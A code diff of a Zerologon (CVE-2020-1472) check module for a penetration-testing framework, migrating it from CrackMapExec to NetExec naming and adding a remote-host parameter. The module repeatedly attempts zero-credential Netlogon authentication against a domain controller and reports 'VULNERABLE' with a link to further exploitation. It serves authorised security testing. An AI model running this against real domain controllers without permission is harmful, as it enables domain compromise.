@@ -1,18 +1,16 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
 # everything is comming from https://github.com/dirkjanm/CVE-2020-1472
 # credit to @dirkjanm
 # module by : @mpgn_x64
 from impacket.dcerpc.v5 import nrpc, epm, transport
 from impacket.dcerpc.v5.rpcrt import DCERPCException
 import sys
-from cme.logger import cme_logger
+from nxc.logger import nxc_logger
 
 # Give up brute-forcing after this many attempts. If vulnerable, 256 attempts are expected to be necessary on average.
 MAX_ATTEMPTS = 2000  # False negative chance: 0.04%
 
 
-class CMEModule:
+class NXCModule:
     name = "zerologon"
     description = "Module to check if the DC is vulnerable to Zerologon aka CVE-2020-1472"
     supported_protocols = ["smb", "wmi"]
@@ -28,7 +26,7 @@ class CMEModule:
 
     def on_login(self, context, connection):
         self.context = context
-        if self.perform_attack("\\\\" + connection.hostname, connection.host, connection.hostname):
+        if self.perform_attack("\\\\" + connection.hostname, connection.host, connection.hostname, connection.host):
             self.context.log.highlight("VULNERABLE")
             self.context.log.highlight("Next step: https://github.com/dirkjanm/CVE-2020-1472")
             try:
@@ -42,31 +40,35 @@ class CMEModule:
                     host.signing,
                     zerologon=True,
                 )
-            except Exception as e:
-                self.context.log.debug(f"Error updating zerologon status in database")
+            except Exception:
+                self.context.log.debug("Error updating zerologon status in database")
 
-    def perform_attack(self, dc_handle, dc_ip, target_computer):
+    def perform_attack(self, dc_handle, dc_ip, target_computer, remoteHost):
         # Keep authenticating until successful. Expected average number of attempts needed: 256.
         self.context.log.debug("Performing authentication attempts...")
         rpc_con = None
         try:
-            binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol="ncacn_ip_tcp")
-            rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
+            binding = epm.hept_map(remoteHost, nrpc.MSRPC_UUID_NRPC, protocol="ncacn_ip_tcp")
+            rpc_con_ = transport.DCERPCTransportFactory(binding.replace(remoteHost, dc_ip))
+            rpc_con_.setRemoteHost(remoteHost)
+            rpc_con = rpc_con_.get_dce_rpc()
             rpc_con.connect()
             rpc_con.bind(nrpc.MSRPC_UUID_NRPC)
-            for attempt in range(0, MAX_ATTEMPTS):
+            for _attempt in range(MAX_ATTEMPTS):
                 result = try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer)
                 if result:
                     return True
             else:
                 self.context.log.highlight("Attack failed. Target is probably patched.")
-        except DCERPCException as e:
-            self.context.log.fail(f"Error while connecting to host: DCERPCException, " f"which means this is probably not a DC!")
+        except DCERPCException:
+            self.context.log.fail("Error while connecting to host: DCERPCException, which means this is probably not a DC!")
+
 
 def fail(msg):
-    cme_logger.debug(msg)
-    cme_logger.fail("This might have been caused by invalid arguments or network issues.")
+    nxc_logger.debug(msg)
+    nxc_logger.fail("This might have been caused by invalid arguments or network issues.")
     sys.exit(2)
+
 
 def try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer):
     # Connect to the DC's Netlogon service.
